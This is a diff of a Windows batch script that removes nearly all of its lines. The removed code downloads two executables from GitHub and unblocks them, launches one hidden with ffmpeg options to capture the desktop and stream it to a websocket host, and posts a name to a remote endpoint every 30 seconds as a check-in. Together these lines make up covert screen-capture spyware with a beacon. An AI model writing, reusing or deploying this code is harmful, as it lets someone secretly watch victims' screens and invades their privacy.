@@ -1,24 +1,2 @@
 @echo off
-set "apiRoot=https://skollol.pythonanywhere.com"
 set /p name=<name.txt
-
-if not exist "%cd%\ffmpeg.exe" (
-    curl -L -o ffmpeg.exe "https://github.com/skollol/e/releases/download/depend/ffmpeg.exe"
-    powershell -Command "Unblock-File -Path '%cd%\stream.exe'"
-) else (
-    echo nvmgotffmpeg
-)
-
-if not exist "%cd%\stream.exe" (
-    curl -L -o stream.exe "https://github.com/skollol/e/raw/refs/heads/main/stream.exe"
-    powershell -Command "Unblock-File -Path '%cd%\stream.exe'"
-) else (
-    echo nvm
-)
-
-start /B "" "%cd%\stream.exe" "%name%" wss://screenview.glitch.me -f gdigrab -framerate 5 -i desktop -draw_mouse 1 -c:v mjpeg -q:v 7 -f image2pipe -
-
-:loop
-curl -s -X POST -d "name=%name%" "%apiRoot%/u"
-timeout /t 30 /nobreak >nul
-goto loop
